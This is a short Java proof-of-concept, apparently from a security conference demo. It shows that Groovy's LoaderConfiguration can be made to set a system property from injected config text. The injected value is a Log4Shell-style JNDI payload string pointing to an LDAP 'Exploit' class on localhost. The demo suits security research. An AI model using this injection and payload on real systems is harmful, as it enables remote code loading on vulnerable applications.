package ru.offzone.demo;

import java.io.ByteArrayInputStream;
import java.io.InputStream;

public class Main0 {
    public static String JNDI_string = "${jndi:ldap://127.0.0.1:7777/Exploit}";
    public static String PropertyKey = "KeyValue";
    
    public static void main(String[] args) throws java.io.IOException {
        System.setProperty(PropertyKey, "");
        if (!System.getProperty(PropertyKey).isEmpty()) {
            throw new AssertionError("Property not nulled");
        }

        String config = "property" + PropertyKey + "=" + JNDI_string;
        InputStream is = new ByteArrayInputStream( config.getBytes() );

        try {
            org.codehaus.groovy.tools.LoaderConfiguration Variable0 = new org.codehaus.groovy.tools.LoaderConfiguration();
            Variable0.configure(is);
        } catch (Exception e) { }
    
        if (!System.getProperty(PropertyKey).equals(JNDI_string)) {
            throw new AssertionError("Property not set");
        }
        System.out.println("Validate OK");
    }
}